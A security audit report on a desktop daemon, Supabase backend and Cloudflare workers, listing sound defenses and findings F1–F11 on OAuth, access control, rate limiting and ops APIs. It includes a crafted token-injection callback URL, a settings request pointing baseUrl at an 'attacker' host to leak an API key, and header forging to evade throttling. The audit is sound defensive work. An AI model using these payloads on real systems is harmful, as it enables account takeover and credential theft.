# Security Audit and Remediation: auth, tenancy, rate limiting, and provider expansion

**Date:** 2026-08-01
**Status:** Approved scope (Andrew). Findings below were produced by reading the current tree, not by pattern matching. Every one carries a `file:line`.
**Applies to:** `lib/`, `supabase/migrations/`, `cloudflare/`, `app/`, `ui/`
**Implementation plan:** [`../plans/2026-08-01-security-audit-and-remediation.md`](../plans/2026-08-01-security-audit-and-remediation.md)

## How to read this

This document is the audit result: what is true about the codebase today. The plan is a separate file. Do not re-audit from scratch. Verify each finding as you reach its task, and if a finding turns out to be wrong, say so and move on rather than inventing a fix for a problem that is not there.

Findings are ordered by severity. F1 through F4 are the ones that matter; the rest is hardening.

## What is already correct

**Do not "improve" any of the following.** Each has a deliberate, commented implementation, several of which read as though written in response to a real incident. Changing them is a regression.

- **The daemon binds loopback only** (`lib/server.js:2186`) and sends **no CORS headers anywhere** in the entire repo. Verified by grep: zero `Access-Control` hits.
- **`Host` is validated on every request including GET** (`lib/server.js:1606`, `localHost`/`hostnameOf` at `:81-91`). Gating reads and not just writes is the correct DNS-rebinding defense, because under rebinding Origin and Host both become the attacker's name and therefore match. An Origin-only check would open.
- **CSRF is gated twice** (`lib/server.js:1607-1612`): same-origin, plus a `Content-Type: application/json` requirement that an HTML form cannot satisfy. The content-type gate holds independently of Origin, which is the right way to build it.
- **There is no dynamic SQL anywhere.** No `EXECUTE`, `format()`, `quote_ident`, or string-concatenated SQL in any function across `schema.sql` and all 26 migrations. Every user value is a bound parameter.
- **All 35 `SECURITY DEFINER` functions pin `search_path`.**
- **`/api/open` cannot be turned into a path or URL primitive** (`lib/api-machine.js`). Zod-validated `kind` enum, client path used only as a lookup key, realpath containment check, `spawnSync` with an argv array and no shell.
- **No XSS in `ui/src/`.** Zero hits for `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`. Teammate text is additionally redacted server-side on read (`lib/server.js:1833-1842`).
- **Electron is hardened** (`app/main.js:158-187`): `contextIsolation: true`, `nodeIntegration: false`, `setWindowOpenHandler` denies unconditionally and only hands `^https?:$` URLs to `shell.openExternal`, `will-navigate` pins the window to the daemon origin. `preload.js` exposes exactly one IPC channel and the main process re-validates its argument.
- **The E2E private key is in the OS keychain** (`lib/keychain.js`), never in argv, fed via stdin, failing closed on unsupported platforms.
- **`counters-worker` input validation is the best-validated code in the repo** (`cloudflare/counters-worker/src/index.js:30-132`): fixed allowlists, UUID and version regexes, body capped and re-checked after read because content-length lies.
- **The team backend URL is host-allowlisted** to `*.supabase.co` (`lib/server.js:106-120`), which is what stops the access token being redirected to an attacker host.

## Findings

### F1. OAuth has no `state` and no PKCE, so the callback is a token-injection sink (CRITICAL)

`oauthAuthorizeUrl` (`lib/teamsync.js:163-167`) builds the entire authorize request as:

```js
return `${be.url}/auth/v1/authorize?provider=github&redirect_to=${encodeURIComponent(redirectTo)}`;
```

No `state`, no `code_challenge`, no `nonce`. Supabase's implicit flow then returns tokens in the URL fragment to `http://127.0.0.1:7437/team/oauth/callback`, where a static page reads them and POSTs them to `/api/team/oauth-complete` (`lib/server.js:128-156`).

**The attack.** Any page the user visits navigates to:

```
http://127.0.0.1:7437/team/oauth/callback#access_token=<ATTACKER_JWT>&refresh_token=<ATTACKER_RT>&expires_in=3600
```

Every existing gate passes. `localHost` passes because Host really is `127.0.0.1`. The CSRF gates at `:1607` are skipped because this is a `GET` navigation. The page then runs *as* origin `http://127.0.0.1:7437`, so its own `fetch` to `/api/team/oauth-complete` is same-origin with the right content type. `loginWithTokens` verifies the token against `/auth/v1/user` (`lib/teamsync.js:177`) and it is genuine, just not the user's. The daemon overwrites `credentials.json` with the attacker's session.

**The escalation.** With `config.team.autoLink` true, `detectAutoLinks` (`lib/teamsync.js:1740-1769`) queries projects by `repo_url` under the now attacker-owned session, matches the victim's git remote, and links and uploads with no confirmation. The attacker pre-creates a project row carrying the victim's public repo URL in their own team; the victim's captured prompts and summaries push to it. Without `autoLink` the same outcome is one UI click away.

The comment at `lib/server.js:1782-1784` says teamsync "verifies them against the backend before anything is stored." That verification proves authenticity, not intent, which is exactly the gap.

Secondary: tokens transit the browser address bar and land in history, and the callback page never clears the fragment (contrast `cloudflare/join/public/index.html:139`, which does). `sameOrigin()` returns true when Origin is absent (`lib/server.js:94`), so any local process can POST tokens with no Origin at all.

### F2. `default_access` is an access control with no backend (CRITICAL)

Migration `026:14-15` adds `projects.default_access` and `026:23` adds a manager-gated RPC to set it. `can_see_project()` (`025:30-38`) never reads it:

```sql
select not exists (
  select 1 from public.project_access a
  where a.project_key = p_project::text
    and a.member_id = auth.uid()
    and a.can_see = false
);
```

Default allow on absence of a row. Nothing creates a `project_access` row when a member joins: `redeem_invite` (`010:275`) and `join_team` (`003:27`) both insert into `team_members` only. A project set to "new members join without access" is fully readable by a brand new member through `memory_entries`, `team_feed`, and `project_stats`. The flag is consumed client-side for display only (`lib/api-access.js:95`, `:106`).

This is the finding a customer would consider a breach: the UI states a restriction the database does not enforce.

### F3. The only rate limit in the system is bypassable (HIGH)

`check_invite_attempt()` (`010:155-202`) derives its throttle key from request headers, preferring `cf-connecting-ip` (`010:175`) on the reasoning at `010:132-136` that Cloudflare stamps it and clients cannot forge it.

**Clients do not go through Cloudflare.** `lib/backend.json` points every desktop client straight at `https://mefgbiecvoszjorwzkfz.supabase.co`, and the join page does the same in-browser (`cloudflare/join/public/index.html:94`). Only the ops API sits behind a Worker. Against the directly addressable origin an attacker sets a fresh `cf-connecting-ip` per request, PostgREST publishes it into `request.headers`, every guess lands in a new bucket, and the limit never trips.

The fallback (last XFF hop, appended by Supabase's own gateway) would have been sound but is never reached.

### F4. `team_feed`'s ACL was silently undone four times (HIGH)

`010:409-410` revoked `team_feed` from public and anon and re-granted to authenticated and service_role. It was then dropped and recreated at `013:21`, `014:32`, `017:32`, and `025:87`. A `DROP` destroys the ACL and the fresh `CREATE` picks up Postgres's default PUBLIC grant plus Supabase's anon and authenticated defaults. **None of those four migrations re-grants.**

Migration `011:130-147` documented this exact hazard and set a policy: "any migration that DROPs and recreates a function MUST fold that function's revoke/grant lines into the SAME migration." Migrations 013, 014, 017 and 025 were all written after that policy and all violate it.

Not currently a data leak, because `is_team_member(p_team)` at `025:123` returns false for anon. But `team_feed` is now an anon-executable RPC running a two-table join, and the stated posture is not the real posture.

Inverse problem from the same era: `project_access_select` (`025:153`) and `team_audit_select` (`024:94`) call `is_team_manager`, which `010:389` revoked from anon. Policy expressions run as the caller, so an anon read returns `permission denied for function` instead of an empty set. That is the failure mode `010:337-341` explicitly called out.

### F5. Every plain member can read every live invite token (HIGH)

`invites_select` (`002:68`) is `for select using (public.is_team_member(team_id))` over a table whose primary key **is** the secret. `create_invite` is manager-gated (`002:85`), but the resulting tokens are readable by everyone on the team. A member who cannot mint invites can read one and re-share it indefinitely.

Compounding: `my_teams()` (`006:23-29`) returns `t.invite_code` to every member, and `teams_select` (`schema.sql:109`) exposes the same column on a direct read. `invite_code` is a permanent, non-expiring, non-use-capped credential redeemed through `join_team` (`003:11`), which has **no throttle at all**.

Also: invites created through the daemon default to no expiry and unlimited uses, because `lib/server.js:1807-1812` passes `null` for both when the caller omits them and `002:59-60` allows nulls.

### F6. The ops surface trusts a string for identity (HIGH)

`ops_set_team_note`, `ops_log`, `ops_rotate_invite`, `ops_create_onboarding_invite` (`021:98`, `:119`, `:138`, `:158`) each check only:

```sql
if p_actor is null or char_length(p_actor) = 0 then
  raise exception 'actor required';
end if;
```

`p_actor` is free text. The comment at `021:26` claims it comes from a verified Cloudflare Access JWT and "the Worker cannot omit it, because it is a required argument." Required is not verified. Anything holding the service key can attribute an action to any operator, and the audit trail it writes is self-attested. `ops_rotate_invite` takes an arbitrary `p_team` and rotates a customer's join code with no ownership check. `ops_team_detail` (`021:240`) and `ops_snapshot` (`022:19`) dump any team's data.

Note the asymmetry: `025:143` fixed this exact class of bug for `team_audit` by adding `and actor_id = auth.uid()`. The ops path never got the same treatment.

`ops_onboarding_invites` (`021:221-235`) returns every unredeemed onboarding token in plaintext, and each token mints a team. A read-only leak of that one function is a write capability.

### F7. `ops-api` fails open on missing configuration (HIGH)

`cloudflare/ops-api/src/index.js:95` and `:107`:

```js
if (aud && !auds.includes(aud)) return null;
...
if (allowed.length && !allowed.includes(email)) return null;
```

If `ACCESS_AUD` is unset or empty, any valid Access token for **any other application on the same team domain** is accepted. The README warns about precisely this and the code silently permits it. If `ALLOWED_EMAILS` is unset or empty, any email that clears Access is authorized.

Everything else in this Worker fails closed correctly, including `alg` confusion (`:77`), which makes the two fail-open branches stand out as oversights rather than decisions.

Related: `cachedKeys` (`:52-59`) is a module global with no TTL and no refresh on `kid` miss. After Cloudflare rotates signing keys, an isolate holding the old set returns `null` for every request until it recycles. Fail-closed, but a hard outage.

### F8. `advisor.baseUrl` is persisted with no validation (MEDIUM, SSRF and key exfiltration)

`lib/server.js:1464`:

```js
if (b.baseUrl !== undefined) p.baseUrl = String(b.baseUrl || '').trim();
```

The sibling test route has an explicit guard for exactly this at `:1702-1720`, with the reasoning written out: "a caller-supplied base URL must NEVER be paired with a server-held key. Pairing them turned this route into a key-exfiltration endpoint."

The persist path has no equivalent. `POST /api/settings` with `{"advisor":{"provider":"local","baseUrl":"http://attacker/v1"}}` sets `baseUrl` and leaves the stored `apiKey` untouched. Because `local` is `needsBaseUrl: true`, `getAdvisorConfig` (`lib/advisor.js:32-33`) then pairs the stored key with the attacker's URL, and the next `/api/plan/generate` ships the key plus project context to the attacker host (`lib/advisors/openai-compatible.js:29`).

CSRF-gated, so it needs local code execution or a same-origin foothold. It is an inconsistency between two routes that should enforce the same rule.

### F9. `credentials.json` is plaintext and there is no device concept (MEDIUM)

Access token and refresh token sit in plaintext at `~/.membridge/credentials.json`, mode 0600 (`lib/teamsync.js:86-96`). Note the asymmetry: the E2E private key gets the OS keychain, and the credential that grants full account access does not.

There is no device table, no device id, no session list, no remote revoke. Copying that file authorizes a new machine silently, with no notification and nothing to revoke short of Supabase-side session invalidation.

Two refresh bugs in the same file: `getAccessToken` (`:197-208`) has no concurrency guard, so two simultaneous refreshes with rotation enabled make one present a consumed token and the user is told to sign in again. And if `authRequest` throws mid-refresh, the old refresh token is already spent server-side while the new one was never persisted, leaving a permanently dead credentials file on disk.

Well defended by contrast, and worth preserving: a leaked *key file* does not get an attacker the team's encrypted history, because the TOFU pin store refuses to silently re-pin (`lib/teampins.js:61-78`). The residual gap is TOFU's inherent one, that a member never pinned by a given teammate is auto-pinned on first sight (`:62-64`).

### F10. There is effectively no rate limiting (MEDIUM)

Grepping `rate.?limit|throttle|429|backoff` across `lib/`, `cloudflare/` and `supabase/` returns exactly one real mechanism: the invite throttle in migration 010, which F3 shows is bypassable.

Unbounded entry points:

- `feedback` insert (`015:21-27`), anon, no throttle, no dedup, no captcha, 5000 chars per row.
- `waitlist` insert (`018:117-124`), anon, no throttle, and **no unique constraint on email** (`018:101-106`), so the same address inserts unboundedly.
- `join_team` (`003:11`), the legacy `invite_code` path: no throttle, no expiry, no use cap.
- `redeem_onboarding_invite` (`021:183-202`), authenticated, no throttle, unlike `redeem_invite`.
- `create_team` (`schema.sql:135`), any authenticated user, unlimited teams.
- The counters Worker: shape is tightly validated but request rate is bounded only by a Cloudflare dashboard rule that is documented as "RECOMMENDED" and cannot be verified from the repo. `install_id` is client-chosen, so synthetic installs inflate any allowlisted counter.
- Every daemon endpoint. The defense is "it is on loopback," which is a boundary, not a bound.
- Supabase `/auth/v1/signup` and password grant: nothing in this repo. `docs/PRELAUNCH.md:156` still lists these as to review.

### F11. Smaller items

- **`gen_random_bytes` is unreachable in `ops_create_onboarding_invite`.** `021:163` pins `search_path = public` but `010:28` installs pgcrypto `with schema extensions`, and `010:53` pins `public, extensions` specifically for this reason. Onboarding invites cannot be minted. This is a functional bug, not just a security one.
- **`search_path` pins omit `pg_temp`.** Currently safe only because every table reference in every body is schema-qualified. Correct by style, not by structure.
- **`can_see_project()` (`025:30`) and `set_project_access_default()` (`026:23`) carry no grant or revoke statements**, so both keep the PUBLIC plus anon defaults. The first needs caller-executability; the second does not.
- **`esc()` does not escape `'`** (`cloudflare/ops-dashboard/public/index.html:206`). Not currently exploitable because every interpolated attribute uses double quotes, but the safety rests on a convention no linter enforces.
- **Electron `sandbox` is not set explicitly** (`app/main.js:158`). Safe on Electron 43 defaults; set it so it cannot silently regress.
- **`memory_entries.author_name` is free text** with no policy binding it to the caller (`schema.sql:47`, insert policy `:126-130` pins only `author_id`). A member can push entries displaying a teammate's name.
- **`team_members_list` returns raw `auth.users` UUIDs** to any member (`002:267-278`), as does `team_feed` (`025:114`). Broader than the UI needs.
- **Default config is written without an explicit mode** (`lib/util.js:128`). No secrets at that point; the first save chmods to 0600.
- **`EXCLUDE_TEAMS` is declared in `ops-api/wrangler.toml` but never read**; `:203` hardcodes `[]`.
